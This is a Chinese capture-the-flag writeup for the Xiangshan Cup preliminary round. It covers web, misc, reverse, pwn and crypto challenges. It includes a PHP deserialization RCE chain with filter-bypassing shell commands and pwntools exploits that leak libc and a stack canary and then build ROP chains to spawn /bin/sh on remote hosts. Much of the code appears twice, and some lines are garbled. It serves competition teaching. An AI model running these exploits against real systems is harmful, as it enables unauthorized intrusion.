# 第三届“香山杯“网络安全大赛初赛Writeup

> 原文: https://www.ctfiot.com/139097.html
> ID: 139097

WEB

PHP_unserialize_pro

题目提示：构造反序列化

源码如下

<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'welcome';
        public function __construct(){
            $this->name = 'Wh0 4m I?';
        }
        public function __destruct(){
            if($this->name == 'A_G00d_H4ck3r'){
                echo $this->arg;
            }
        }
    }

    class G00d{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            if(preg_match('/f|l|a|g|*|?/i', $cmd)){
                die("U R A BAD GUY");
            }
            eval($shell($cmd));
        }
    }

    class H4ck3r{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['data']))
        unserialize($_GET['data']);
    else
        highlight_file(__FILE__);
?>

很简单的POP链子：Welcome()->__construct() 赋值name -> __destruct() -> echo触发来到__toString() -> $this->func = new G00d(); -> __invoke() -> 绕过preg_match 成功RCE

附上exp

尝试了一下，挺多种绕过姿势的，代码如下。

<?php
error_reporting(0);
class Welcome{
    public $name = 'A_G00d_H4ck3r';
    public $arg = 'welcome';
    public function __construct(){
        $this->name == 'A_G00d_H4ck3r';
    }
}

class G00d{
    //本地调试打好的题
//    public $shell = 'strtolower';
//    public $cmd = 'dir ../../../../../';
//    public $cmd = 'show_source(chr(47).chr(102).chr(49).chr(97).chr(103));';

    public $shell = 'system';
//    public $cmd = 'dir';
//    public $cmd = 'more /[e-h]1[0-b][e-h]';
    public $cmd = 'sort /[!q]1[!q][!q]';
//    public $cmd = 'cd /;echo `more dir`';
    
    public function __invoke(){ //__invoke会在把对象当作一个方法调用的时候自动调用
        $shell = $this->shell;
        $cmd = $this->cmd;
        if(preg_match('/f|l|a|g|*|?/i', $cmd)){
            die("U R A BAD GUY");
        }
        eval($shell($cmd));
    }
}

class H4ck3r{
    public $func;
    public function __construct(){
        $this->func = new G00d();
    }
}
$a = new Welcome();
$a->arg = new H4ck3r();
echo serialize($a);
data传参生成的poc获取flag值

MISC

签到

签个到完事了，base64解密一次 iodj{zh1f0p3_2_Fwi}

再利用 rot参数偏移 23 解密得到flag值

RE

URL从哪儿来

下载得到附件，无壳32位

ida32打开，进到main函数

程序运行后会在内存加载出ou.exe文件，直接动调导出来，得到ou.exe文件

依旧是无壳32位

看一眼main函数，直接动调

提取出来 base64解密获取flag

hello_py

这个题使用了Chaquopy技术来调用python代码，需要找到python源码

提取得到 hello.py 代码如下

from java import jboolean ,jclass #line:1
import struct #line:3
import ctypes #line:4
def MX (O0O00OOO00OO00O00 ,O0OO0O00OO0O000OO ,OO000OO000000O0O0 ,OOO00O00OOO000OOO ,OO0OOO0OOO0OOOO0O ,O0OO000O0000O000O ):#line:7
    OOO000O0O0OO00000 =(O0O00OOO00OO00O00 .value >>5 ^O0OO0O00OO0O000OO .value <<2 )+(O0OO0O00OO0O000OO .value >>3 ^O0O00OOO00OO00O00 .value <<4 )#line:8
    OOO0OOOOOO0O0OO00 =(OO000OO000000O0O0 .value ^O0OO0O00OO0O000OO .value )+(OOO00O00OOO000OOO [(OO0OOO0OOO0OOOO0O &3 )^O0OO000O0000O000O .value ]^O0O00OOO00OO00O00 .value )#line:9
    return ctypes .c_uint32 (OOO000O0O0OO00000 ^OOO0OOOOOO0O0OO00 )#line:11
def encrypt (OO0OO0O0O0O0O0OO0 ,OOO0O0OO0O0OOO000 ,OO0OOOO0OO0OOO0O0 ):#line:14
    O0OOO0OO00O0000OO =0x9e3779b9 #line:15
    OOOO0OOOO00O0OOOO =6 +52 //OO0OO0O0O0O0O0OO0 #line:16
    O00OO00000O0OO00O =ctypes .c_uint32 (0 )#line:18
    OO0OOOO0O0O0O0OO0 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ])#line:19
    OOOOO00000OOOOOOO =ctypes .c_uint32 (0 )#line:20
    while OOOO0OOOO00O0OOOO >0 :#line:22
        O00OO00000O0OO00O .value +=O0OOO0OO00O0000OO #line:23
        OOOOO00000OOOOOOO .value =(O00OO00000O0OO00O .value >>2 )&3 #line:24
        for OO0O0OOO000O0000O in range (OO0OO0O0O0O0O0OO0 -1 ):#line:25
            OOO0OO00O0OO0O000 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O +1 ])#line:26
            OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]=ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]+MX (OO0OOOO0O0O0O0OO0 ,OOO0OO00O0OO0O000 ,O00OO00000O0OO00O ,OO0OOOO0OO0OOO0O0 ,OO0O0OOO000O0000O ,OOOOO00000OOOOOOO ).value ).value #line:27
            OO0OOOO0O0O0O0OO0 .value =OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]#line:28
        OOO0OO00O0OO0O000 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [0 ])#line:29
        OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]=ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]+MX (OO0OOOO0O0O0O0OO0 ,OOO0OO00O0OO0O000 ,O00OO00000O0OO00O ,OO0OOOO0OO0OOO0O0 ,OO0OO0O0O0O0O0OO0 -1 ,OOOOO00000OOOOOOO ).value ).value #line:30
        OO0OOOO0O0O0O0OO0 .value =OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]#line:31
        OOOO0OOOO00O0OOOO -=1 #line:32
    return OOO0O0OO0O0OOO000 #line:34

def check (O0000000000O0O0O0 ):#line:63
    print ("checking~~~: "+O0000000000O0O0O0 )#line:64
    O0000000000O0O0O0 =str (O0000000000O0O0O0 )#line:65
    if len (O0000000000O0O0O0 )!=36 :#line:66
        return jboolean (False )#line:67
    O00OO00000OO0OOOO =[]#line:69
    for O0O0OOOOO0OOO0OOO in range (0 ,36 ,4 ):#line:70
        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :
O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
        O00OO00000OO0OOOO .append (OO0OO0OOO000OO0O0 )#line:72
    _O00OO0OOOOO00O00O =[]#line:73
    for O0O0OOOOO0OOO0OOO in O00OO00000OO0OOOO :#line:74
        _O00OO0OOOOO00O00O .append (struct .unpack ("> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
    temp2 = (total .value ^ y .value)+(tea_key[(p & 3) ^ e .value] ^ z .value)  # line:9
    return ctypes.c_uint32(temp1 ^ temp2)  # line:11

def decrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52//n 
    
    total = ctypes.c_uint32(rounds * delta)
    y = ctypes.c_uint32(v[0])
    e = ctypes.c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = ctypes.c_uint32(v[p-1])
            v[p] = ctypes.c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value
            y.value = v[p]
        z = ctypes.c_uint32(v[n-1])  
        v[0] = ctypes.c_uint32(v[0] - MX(z,y,total,key,0,e).value).value
        y.value = v[0]  
        total.value -= delta
        rounds -= 1

    return v 

key_str = [689085350, 626885696, 1894439255, 1204672445, 1869189675, 475967424, 1932042439, 1280104741, 2808893494]
res = encrypt_input = decrypt(9, key_str, [12345678, 12398712, 91283904, 12378192])
for i in res:
    print(hex(i)[2:])

运行得到结果

# 38663163
# 36656361
# 3462342d
# 39342d36
# 622d3133
# 2d623532
# 31303161
# 39386130
# 32393563

这里内存存储是小端序存储，进行恢复大端序

# 63 31 66 38
# 61 63 65 36
# 2d 34 62 34
# 36 2d 34 39
# 33 31 2d 62
# 32 35 62 2d
# 61 31 30 31
# 30 61 38 39
# 63 35 39 32

最后利用工具 Cyber解密即可

PWN

MOVE

代码审计

漏洞在vuln函数，有栈溢出漏洞

思路

我们通过栈迁移到sskd的位置，然后泄露出来libc地址，然后回到main，再次栈溢出，然后构造ROP就可以getshell

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("/home/kaijia/libc-database/db/libc6_2.27-3ubuntu1.5_amd64.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("39.106.48.123",27711)
    elf = ELF(name)

get_p("./pwn")
ssx = 0x00000000004050A0
pop_rdi = 0x0000000000401353
leave_ret = 0x000000000040124b

payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

p.sendafter("lets travel again!",payload)

p.sendafter("Input your setp number",p32(305419896))
payload =b"A"*0x30 +  p64(ssx - 8) + p64(leave_ret)
p.sendafter("TaiCooLa",payload)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b'x00')) - libc.sym['puts']
print(hex(libc.address))
binsh = next(libc.search(b"/bin/sh"))
# gdb.attach(p,"")
# sleep(2)
payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
p.sendafter("lets travel again!",payload)
# p.sendafter("Input your setp number",p32(305419896))
# payload =b"A"*0x30 +  p64(ssx - 8) + p64(leave_ret)
# p.sendafter("TaiCooLa",payload)
p.interactive()

Pwthon

代码审计

可以发现是用so文件里的函数

这里可以分析有格式化字符串漏洞和栈溢出，也提供了该so文件的运行地址

思路

我们可以通过格式化字符串漏洞泄露出来canary的值，然后我们在通过ROP泄露出来libc地址，然后我们就可以回到漏洞函数，进行ROP然后getshell

exp

from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("/home/kaijia/libc-database/db/libc6_2.27-3ubuntu1.5_amd64.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("59.110.125.41",41248)
    elf = ELF(name)

get_p("./app.cpython-37m-x86_64-linux-gnu.so")
p.sendlineafter("> ",'0')
p.recvuntil("0x")
elf.address = int(p.recv(12),16) - 0x0000000000068B0
print(hex(elf.address))
p.sendline("%p"*37 + "+%p")
p.recvuntil("+")
canary = int(p.recv(18),16)
print(hex(canary))

ret = 0x000000000000301a + elf.address
main = elf.address + 0x00000000000099f0
pop_rdi = 0x0000000000003f8f + elf.address
payload = b"x00"*0x108 + p64(canary) + p64(some_thing)  + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
sleep(2)
p.sendline(payload)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - libc.sym['puts']
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))

print(hex(libc.address))
payload = b"A"*0x108 + p64(canary) + p64(0) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) 
p.sendlineafter("Give you a gift","Feng_ZZ")
sleep(2)
p.sendline(payload)
p.interactive()

Crypto

hint = 251
n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162

def hensel_lifting(m, c, e, p, k):
    mk = int(m % p)
    t = int(m * pow(c,-1, p) % p)
    pk = int(p)
    for _ in range(1, k):
        pk*=p
        x = int((c - pow(mk, e, pk)) % pk)
        y = int((x * t * int(pow(e, -1, p))) % pk)
        mk=mk+y
    return mk

g = hint
r= 5
P.<x> = PolynomialRing(Zmod(n))
f = e * x - hint
x0 = f.monic().small_roots(beta=0.65)[e]
print(f'{x0 = }')

g = gcd(ZZ(f(x0)),n)
p = ZZ(pow(g,1 / (r - 1)))
q=n //p**r
assert p ** 5 * q == n
phi =p**4*(p-1)* (q - 1)
t = gcd(e, phi)
d = pow(e // t,-1, phi)
m = pow(c, d,n)
print(p)
print(q)
print(t)
t = 251
mps = AMM(m, t,p, True)
mqs = AMM(m,t,q,True)
print(f'{mps = }')
print(f'{mqs = }')

mprs = [hensel_lifting(mp, m, t, p, r) for mp in mps]
import itertools
for mpr, mq in itertools.product(mprs, mqs):
    m = crt([mpr, mq], [p ** r, q])
if b'flag'in long_to_bytes(int(m)):
    print(long_to_bytes(int(m)))

模块没导入的可以用sage跑


```
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'welcome';
        public function __construct(){
            $this->name = 'Wh0 4m I?';
        }
        public function __destruct(){
            if($this->name == 'A_G00d_H4ck3r'){
                echo $this->arg;
            }
        }
    }

    class G00d{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            if(preg_match('/f|l|a|g|*|?/i', $cmd)){
                die("U R A BAD GUY");
            }
            eval($shell($cmd));
        }
    }

    class H4ck3r{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['data']))
        unserialize($_GET['data']);
    else
        highlight_file(__FILE__);
?>
附上exp
<?php
error_reporting(0);
class Welcome{
    public $name = 'A_G00d_H4ck3r';
    public $arg = 'welcome';
    public function __construct(){
        $this->name == 'A_G00d_H4ck3r';
    }
}

class G00d{
    //本地调试打好的题
//    public $shell = 'strtolower';
//    public $cmd = 'dir ../../../../../';
//    public $cmd = 'show_source(chr(47).chr(102).chr(49).chr(97).chr(103));';

    public $shell = 'system';
//    public $cmd = 'dir';
//    public $cmd = 'more /[e-h]1[0-b][e-h]';
    public $cmd = 'sort /[!q]1[!q][!q]';
//    public $cmd = 'cd /;echo `more dir`';
    
    public function __invoke(){ //__invoke会在把对象当作一个方法调用的时候自动调用
        $shell = $this->shell;
        $cmd = $this->cmd;
        if(preg_match('/f|l|a|g|*|?/i', $cmd)){
            die("U R A BAD GUY");
        }
        eval($shell($cmd));
    }
}

class H4ck3r{
    public $func;
    public function __construct(){
        $this->func = new G00d();
    }
}
$a = new Welcome();
$a->arg = new H4ck3r();
echo serialize($a);
data传参生成的poc获取flag值
from java import jboolean ,jclass #line:1
import struct #line:3
import ctypes #line:4
def MX (O0O00OOO00OO00O00 ,O0OO0O00OO0O000OO ,OO000OO000000O0O0 ,OOO00O00OOO000OOO ,OO0OOO0OOO0OOOO0O ,O0OO000O0000O000O ):#line:7
    OOO000O0O0OO00000 =(O0O00OOO00OO00O00 .value >>5 ^O0OO0O00OO0O000OO .value <<2 )+(O0OO0O00OO0O000OO .value >>3 ^O0O00OOO00OO00O00 .value <<4 )#line:8
    OOO0OOOOOO0O0OO00 =(OO000OO000000O0O0 .value ^O0OO0O00OO0O000OO .value )+(OOO00O00OOO000OOO [(OO0OOO0OOO0OOOO0O &3 )^O0OO000O0000O000O .value ]^O0O00OOO00OO00O00 .value )#line:9
    return ctypes .c_uint32 (OOO000O0O0OO00000 ^OOO0OOOOOO0O0OO00 )#line:11
def encrypt (OO0OO0O0O0O0O0OO0 ,OOO0O0OO0O0OOO000 ,OO0OOOO0OO0OOO0O0 ):#line:14
    O0OOO0OO00O0000OO =0x9e3779b9 #line:15
    OOOO0OOOO00O0OOOO =6 +52 //OO0OO0O0O0O0O0OO0 #line:16
    O00OO00000O0OO00O =ctypes .c_uint32 (0 )#line:18
    OO0OOOO0O0O0O0OO0 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ])#line:19
    OOOOO00000OOOOOOO =ctypes .c_uint32 (0 )#line:20
    while OOOO0OOOO00O0OOOO >0 :#line:22
        O00OO00000O0OO00O .value +=O0OOO0OO00O0000OO #line:23
        OOOOO00000OOOOOOO .value =(O00OO00000O0OO00O .value >>2 )&3 #line:24
        for OO0O0OOO000O0000O in range (OO0OO0O0O0O0O0OO0 -1 ):#line:25
            OOO0OO00O0OO0O000 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O +1 ])#line:26
            OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]=ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]+MX (OO0OOOO0O0O0O0OO0 ,OOO0OO00O0OO0O000 ,O00OO00000O0OO00O ,OO0OOOO0OO0OOO0O0 ,OO0O0OOO000O0000O ,OOOOO00000OOOOOOO ).value ).value #line:27
            OO0OOOO0O0O0O0OO0 .value =OOO0O0OO0O0OOO000 [OO0O0OOO000O0000O ]#line:28
        OOO0OO00O0OO0O000 =ctypes .c_uint32 (OOO0O0OO0O0OOO000 [0 ])#line:29
        OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]=ctypes .c_uint32 (OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]+MX (OO0OOOO0O0O0O0OO0 ,OOO0OO00O0OO0O000 ,O00OO00000O0OO00O ,OO0OOOO0OO0OOO0O0 ,OO0OO0O0O0O0O0OO0 -1 ,OOOOO00000OOOOOOO ).value ).value #line:30
        OO0OOOO0O0O0O0OO0 .value =OOO0O0OO0O0OOO000 [OO0OO0O0O0O0O0OO0 -1 ]#line:31
        OOOO0OOOO00O0OOOO -=1 #line:32
    return OOO0O0OO0O0OOO000 #line:34

def check (O0000000000O0O0O0 ):#line:63
    print ("checking~~~: "+O0000000000O0O0O0 )#line:64
    O0000000000O0O0O0 =str (O0000000000O0O0O0 )#line:65
    if len (O0000000000O0O0O0 )!=36 :#line:66
        return jboolean (False )#line:67
    O00OO00000OO0OOOO =[]#line:69
    for O0O0OOOOO0OOO0OOO in range (0 ,36 ,4 ):#line:70
        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :
O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
        O00OO00000OO0OOOO .append (OO0OO0OOO000OO0O0 )#line:72
    _O00OO0OOOOO00O00O =[]#line:73
    for O0O0OOOOO0OOO0OOO in O00OO00000OO0OOOO :#line:74
        _O00OO0OOOOO00O00O .append (struct .unpack ("> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
    temp2 = (total .value ^ y .value)+(tea_key[(p & 3) ^ e .value] ^ z .value)  # line:9
    return ctypes.c_uint32(temp1 ^ temp2)  # line:11

def decrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52//n 
    
    total = ctypes.c_uint32(rounds * delta)
    y = ctypes.c_uint32(v[0])
    e = ctypes.c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = ctypes.c_uint32(v[p-1])
            v[p] = ctypes.c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value
            y.value = v[p]
        z = ctypes.c_uint32(v[n-1])  
        v[0] = ctypes.c_uint32(v[0] - MX(z,y,total,key,0,e).value).value
        y.value = v[0]  
        total.value -= delta
        rounds -= 1

    return v 

key_str = [689085350, 626885696, 1894439255, 1204672445, 1869189675, 475967424, 1932042439, 1280104741, 2808893494]
res = encrypt_input = decrypt(9, key_str, [12345678, 12398712, 91283904, 12378192])
for i in res:
    print(hex(i)[2:])
# 38663163
# 36656361
# 3462342d
# 39342d36
# 622d3133
# 2d623532
# 31303161
# 39386130
# 32393563
# 63 31 66 38
# 61 63 65 36
# 2d 34 62 34
# 36 2d 34 39
# 33 31 2d 62
# 32 35 62 2d
# 61 31 30 31
# 30 61 38 39
# 63 35 39 32
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("/home/kaijia/libc-database/db/libc6_2.27-3ubuntu1.5_amd64.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("39.106.48.123",27711)
    elf = ELF(name)

get_p("./pwn")
ssx = 0x00000000004050A0
pop_rdi = 0x0000000000401353
leave_ret = 0x000000000040124b

payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

p.sendafter("lets travel again!",payload)

p.sendafter("Input your setp number",p32(305419896))
payload =b"A"*0x30 +  p64(ssx - 8) + p64(leave_ret)
p.sendafter("TaiCooLa",payload)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b'x00')) - libc.sym['puts']
print(hex(libc.address))
binsh = next(libc.search(b"/bin/sh"))
# gdb.attach(p,"")
# sleep(2)
payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
p.sendafter("lets travel again!",payload)
# p.sendafter("Input your setp number",p32(305419896))
# payload =b"A"*0x30 +  p64(ssx - 8) + p64(leave_ret)
# p.sendafter("TaiCooLa",payload)
p.interactive()
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("/home/kaijia/libc-database/db/libc6_2.27-3ubuntu1.5_amd64.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("59.110.125.41",41248)
    elf = ELF(name)

get_p("./app.cpython-37m-x86_64-linux-gnu.so")
p.sendlineafter("> ",'0')
p.recvuntil("0x")
elf.address = int(p.recv(12),16) - 0x0000000000068B0
print(hex(elf.address))
p.sendline("%p"*37 + "+%p")
p.recvuntil("+")
canary = int(p.recv(18),16)
print(hex(canary))

ret = 0x000000000000301a + elf.address
main = elf.address + 0x00000000000099f0
pop_rdi = 0x0000000000003f8f + elf.address
payload = b"x00"*0x108 + p64(canary) + p64(some_thing)  + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
sleep(2)
p.sendline(payload)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - libc.sym['puts']
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))

print(hex(libc.address))
payload = b"A"*0x108 + p64(canary) + p64(0) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) 
p.sendlineafter("Give you a gift","Feng_ZZ")
sleep(2)
p.sendline(payload)
p.interactive()
hint = 251
n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162

def hensel_lifting(m, c, e, p, k):
    mk = int(m % p)
    t = int(m * pow(c,-1, p) % p)
    pk = int(p)
    for _ in range(1, k):
        pk*=p
        x = int((c - pow(mk, e, pk)) % pk)
        y = int((x * t * int(pow(e, -1, p))) % pk)
        mk=mk+y
    return mk

g = hint
r= 5
P.<x> = PolynomialRing(Zmod(n))
f = e * x - hint
x0 = f.monic().small_roots(beta=0.65)[e]
print(f'{x0 = }')

g = gcd(ZZ(f(x0)),n)
p = ZZ(pow(g,1 / (r - 1)))
q=n //p**r
assert p ** 5 * q == n
phi =p**4*(p-1)* (q - 1)
t = gcd(e, phi)
d = pow(e // t,-1, phi)
m = pow(c, d,n)
print(p)
print(q)
print(t)
t = 251
mps = AMM(m, t,p, True)
mqs = AMM(m,t,q,True)
print(f'{mps = }')
print(f'{mqs = }')

mprs = [hensel_lifting(mp, m, t, p, r) for mp in mps]
import itertools
for mpr, mq in itertools.product(mprs, mqs):
    m = crt([mpr, mq], [p ** r, q])
if b'flag'in long_to_bytes(int(m)):
    print(long_to_bytes(int(m)))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1697418089.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/4-1697418090.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/3-1697418090.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1697418091.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/6-1697418091.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/0-1697418092.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/9-1697418093.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1697418093.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/4-1697418094.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1697418095.png)